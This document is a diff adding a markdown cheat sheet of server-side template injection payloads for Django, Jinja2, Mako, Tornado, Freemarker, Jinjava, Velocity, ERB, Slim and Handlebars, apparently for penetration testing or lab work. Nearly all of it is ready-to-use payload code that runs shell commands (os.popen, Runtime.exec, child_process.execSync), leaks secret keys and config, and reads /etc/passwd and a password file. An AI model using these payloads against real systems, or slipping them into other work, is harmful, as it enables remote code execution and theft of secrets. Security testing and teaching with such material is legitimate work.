@@ -1,0 +1,91 @@
+## Note:
+- Look for reflection of user-controled input
+
+## Python Templating Engines:
+Django 
+```
+{{ 7*7 }} 
+{{ settings.SECRET_KEY }}
+{% debug %}
+```
+Jinja2 
+```
+{{ 7*7 }} 
+{{ ''.__class__.__mro__[1].__subclasses__() }} 
+{{ config.items() }}
+{{ config.__class__.__init__.__globals__['os'].getcwd() }}
+{{ config.__class__.__init__.__globals__['os'].listdir('/app') }}
+{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}
+```
+Mako
+```
+<% import os %>
+${os.popen('id').read()} 
+${7*7}  # Output: 49
+```
+Tornado 
+```
+{{ __import__('os').popen('ls -la').read()}}
+```
+## Java Templating Engines:
+Freemarker
+```
+${7*7} 
+${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls -la") }
+
+<#assign classloader=<______object here______>.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
+<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
+${dwf.newInstance(ec,null)("ls -la")}
+```
+Jinjava
+```
+{{ 7*7 }}  # Output: 49
+{{ ''.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}  
+```
+Apache Velocity
+```
+#set($foo = "7*7") $foo  
+#set($foo = "''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')") 
+```
+## Ruby Templating Engines:
+ERB (Embedded Ruby)
+```
+<%= 7 * 7 %> 
+<%= `id` %>  
+<%= self.class.name %>
+<%= self.methods %>
+<%= ENV['HOME'] %>
+<%= File.read('/etc/passwd') %>
+<%= system('ls') %>
+```
+Slim
+```
+= 7 * 7 
+= `id` 
+```
+## NoteJS
+Handlebars 
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la').toString();"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
